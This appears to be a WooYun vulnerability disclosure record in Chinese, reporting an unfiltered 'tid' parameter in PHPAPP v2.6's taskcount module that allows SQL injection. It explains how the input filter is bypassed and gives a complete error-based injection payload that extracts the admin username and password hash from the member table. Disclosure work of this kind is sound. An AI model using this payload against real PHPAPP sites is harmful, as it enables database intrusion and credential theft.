{"id": 41386, "wybug_id": "wooyun-2014-089018", "wybug_title": "PHPAPP注入第真十二枚（无视过滤）", "wybug_corp": "PHPAPP", "wybug_author": "路人甲", "wybug_date": "2014-12-30 15:14", "wybug_open_date": "2015-03-30 15:16", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-30：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： PHPAPP注入第真十二枚（无视过滤） 详细说明：  在wooyun上看到了有人提了PHPAPP的漏洞： http://wooyun.org/bugs/wooyun-2010-055604，然后去官网看了看，前几天刚有更新，就在官网下了PHPAPP最新的v2.6来看看(2014-12-11更新的)。PSOT注入点：wwww.xxx.com/index.php?action=8&app=80, 存在漏洞的文件在/phpapp/apps/taskcount/main_phpapp.php下面分析一下漏洞产生的原因第一处绕过：先看看是如何得到$_POST中的内容的，$this->POST=$this->POSTArray();如果key的最后一个字母是’_s’时，用户的输入会经过str方法的防注处理。而如果key（参数）的最后一个字母不是’_s’，则可以功能绕过过滤！第二处绕过:\nfunction  AddMessageAction(){\t\t $uid=$this->uid;\t\t\t\t\t\t if($uid>0){\t\t\t \t\t\t \t\t\t    $allow=$this->CheckAllow('task_count_usergroup',array(\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t'messagetask'=>''\t\t\t\t\t\t\t\t\t\t\t\t\t )\t\t\t\t\t\t\t\t\t\t\t );\t\t\t\t$this->AddMessage($uid,$allow);\t\t\t\t\t\t\t\t\t\t }else{\t\t\t   echo '请选择登录后操作!<br />';\t\t\t   echo $this->CloseNowWindows('#loading');\t\t }\t\t\t\t\t}\n调用了AddMessage方法，去看看\nfunction  AddMessage($uid,$allow){\t\t\t\t  if($this->POST['Submit']){\t\t\t \t\t\t\t\t\t\t\t\t\t \t\t\t            if($allow=='ok'){\t\t\t\t\t\t\t\t$this->tid=$this->POST['tid'];\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$strings=new CharFilter($this->POST['content']);\t\t\t\t\t\t\t\tif(empty($this->POST['content'])){\t\t\t\t\t\t\t\t\t echo '请输入留言内容!';\t\t\t\t\t\t\t\t\t echo $this->CloseNowWindows('#loading');\t\t\t\t\t\t\t\t}elseif($strings->CheckLength(2)){ \t\t\t\t\t\t\t\t\t echo '对不起！,任务留言不能少2个字!';\t\t\t\t\t\t\t\t\t echo $this->CloseNowWindows('#loading');\t\t\t\t\t\t\t\t}else{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t //过虑\t\t\t\t\t\t\t\t\t $content=$this->str($this->POST['content'],200,0,1,1,0,1);\t\t\t\t\t\t\t\t\t \t\t\t\t\t\t\t\t\t if($this->tid!=0){\t\t\t\t\t\t\t\t\t\t   \t\t\t\t\t\t\t\t\t\t \t\t\t\t\t\t\t\t\t\t   $newid=$this->Insert('task_message',array('appid'=>$this->app,'uid'=>$uid,'tid'=>$this->tid,'content'=>$content,'dateline'=>$this->NowTime()),array());\t\t\t\t\t\t\t\t\t\t   \t\t\t\t\t\t\t\t\t\t   $task=$this->GetMysqlOne('uid,subject,url',\" \".$this->GetTable('task').\" WHERE tid='$this->tid'\");无关代码\n$this->tid直接由$this->POST['tid']赋值，没有再经过过滤，造成注入。Phpapp可以显错，那就用error-based blind进行注入。Pyload：(POST提交)\nSubmit=567&content=testsql&tid=1' and (select 1 from (select count(*),concat(floor(rand(0)*2),(select concat(0x23,username,0x23,password) from phpapp_member limit 0,1))a from information_schema.tables group by a)b) or'\n注入成功，管理员用户名及密码如下图中所示：\n\n   漏洞证明：  见 详细说明   修复方案：  $this->str()   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}